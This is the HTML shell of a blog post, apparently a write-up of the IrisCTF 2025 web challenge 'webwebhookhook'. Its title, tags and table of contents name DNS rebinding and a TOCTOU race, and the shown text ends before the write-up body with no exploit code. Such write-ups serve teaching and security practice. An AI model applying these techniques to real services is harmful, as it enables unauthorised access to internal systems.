<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><title>IrisCTF 2025 - webwebhookhook &#183; simonedimaria's blog</title>
<meta name=title content="IrisCTF 2025 - webwebhookhook &#183; simonedimaria's blog"><meta name=description content="Writeup for webwebhookhook web challenge of IrisCTF 2025"><meta name=keywords content="writeup,DNS rebinding,race condition,TOCTOU,"><link rel=canonical href=https://simonedimaria.github.io/posts/irisctf-2025/webwebhookhook/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1202079f341d659aed403bcef044aad99bed874a22efa5b3ad2bed4f1e3ed4a9c642278ee4e6346f304847d112438196535ea95e4eeafb074f141a8b1a9425f4.css integrity="sha512-EgIHnzQdZZrtQDvO8ESq2Zvth0oi76WzrSvtTx4+1KnGQieO5OY0bzBIR9ESQ4GWU16pXk7q+wdPFBqLGpQl9A=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.3ad74b33440334ca29f8801ec6dac1f314951cf580e503d49631816b48d1f28d03543275f92b651565b48045b90731f47595b1396214b8b6aa11c6990f867f7e.js integrity="sha512-OtdLM0QDNMop+IAextrB8xSVHPWA5QPUljGBa0jR8o0DVDJ1+StlFWW0gEW5BzH0dZWxOWIUuLaqEcaZD4Z/fg==" data-copy data-copied></script><script src=/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://simonedimaria.github.io/posts/irisctf-2025/webwebhookhook/"><meta property="og:site_name" content="simonedimaria's blog"><meta property="og:title" content="IrisCTF 2025 - webwebhookhook"><meta property="og:description" content="Writeup for webwebhookhook web challenge of IrisCTF 2025"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-01-12T00:00:00+01:00"><meta property="article:modified_time" content="2025-01-12T00:00:00+01:00"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="DNS Rebinding"><meta property="article:tag" content="Race Condition"><meta property="article:tag" content="TOCTOU"><meta property="og:image" content="https://simonedimaria.github.io/posts/irisctf-2025/webwebhookhook/featured_irisctf2025-ascii-banner.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://simonedimaria.github.io/posts/irisctf-2025/webwebhookhook/featured_irisctf2025-ascii-banner.png"><meta name=twitter:title content="IrisCTF 2025 - webwebhookhook"><meta name=twitter:description content="Writeup for webwebhookhook web challenge of IrisCTF 2025"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Blog","name":"IrisCTF 2025 - webwebhookhook","headline":"IrisCTF 2025 - webwebhookhook","abstract":"Writeup for webwebhookhook web challenge of IrisCTF 2025","inLanguage":"en","url":"https:\/\/simonedimaria.github.io\/posts\/irisctf-2025\/webwebhookhook\/","author":{"@type":"Person","name":"simonedimaria"},"copyrightYear":"2025","dateCreated":"2025-01-12T00:00:00\u002b01:00","datePublished":"2025-01-12T00:00:00\u002b01:00","dateModified":"2025-01-12T00:00:00\u002b01:00","keywords":["writeup","DNS rebinding","race condition","TOCTOU"],"mainEntityOfPage":"true","wordCount":"2490"}]</script><meta name=author content="simonedimaria"><link href=https://x.com/dimariasimone rel=me><link href=https://github.com/simonedimaria rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><script defer type=text/javascript src=/js/mermaid.bundle.57e169b6a486acce1091311d3dd7e6892128115a9c105e970e4fafd3706119e8099b1ec9b9a61098ebc8c0aab81bad21c42d34d4869255a53ddfa6a77a331e1d.js integrity="sha512-V+FptqSGrM4QkTEdPdfmiSEoEVqcEF6XDk+v03BhGegJmx7JuaYQmOvIwKq4G60hxC001IaSVaU936anejMeHQ=="></script><meta name=theme-color></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px]" style=z-index:100><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div style=padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">simonedimaria&rsquo;s blog</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Blog>Blog</p></a><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Tags>Tags</p></a><a href=https://x.com/dimariasimone target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span><p class="text-base font-medium" title></p></a><a href=https://github.com/simonedimaria target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><p class="text-base font-medium" title></p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><label id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper style=padding-top:5px class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Blog>Blog</p></a></li><li class=mt-1><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Tags>Tags</p></a></li><li class=mt-1><a href=https://x.com/dimariasimone target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li><li class=mt-1><a href=https://github.com/simonedimaria target=_blank class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><div><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></div><p class="text-bg font-bg" title></p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></label></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script>window.addEventListener("scroll",function(){var t=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,n=document.getElementById("menu-blur");n.style.opacity=t/300})</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><figure><img class="w-full rounded-lg single_hero_round nozoom" alt="IrisCTF 2025 - webwebhookhook" width=1200 height=123 src=/posts/irisctf-2025/webwebhookhook/background_irisctf2025-ascii-banner_hu_9019da46faf98df6.png></figure><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Blog</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/irisctf-2025/>posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/irisctf-2025/webwebhookhook/>IrisCTF 2025 - webwebhookhook</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">IrisCTF 2025 - webwebhookhook</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-01-12T00:00:00+01:00>12 January 2025</time><span class="px-2 text-primary-500">&#183;</span><span>2490 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&#183;</span>
<script type=text/javascript src=/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw+xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script><span class=mb-[2px]><span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentcolor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/categories/web/","_self"),!1'><span class=flex style=cursor:pointer><span class="bg-blue-700 rounded-full border-2 border-neutral-200 px-3 py-1 text-sm font-normal text-neutral-200 dark:border-neutral-400 dark:text-neutral-200">üåê Web
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/writeup/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Writeup
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/dns-rebinding/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">DNS Rebinding
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/race-condition/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Race Condition
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/toctou/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TOCTOU</span></span></span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt=simonedimaria src=/img/gatto-stregone-ciccione_hu_69c1c100a967a305.jpeg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">simonedimaria</div><div class="text-sm text-neutral-700 dark:text-neutral-400"><em>I make a bunch of electrons dance on some rock to hack stuff</em></div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://x.com/dimariasimone target=_blank aria-label=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/simonedimaria target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#description>Description</a></li><li><a href=#source-code-analysis>Source code analysis</a></li><li><a href=#vulnerability-discovery>Vulnerability discovery</a><ul><li><a href=#doomscrolling-remembrance-of-a-random-tweet-to-win>Doomscrolling remembrance of a random tweet to win</a></li><li><a href=#toctou-race--dns-cache-revalidation>TOCTOU race + DNS cache 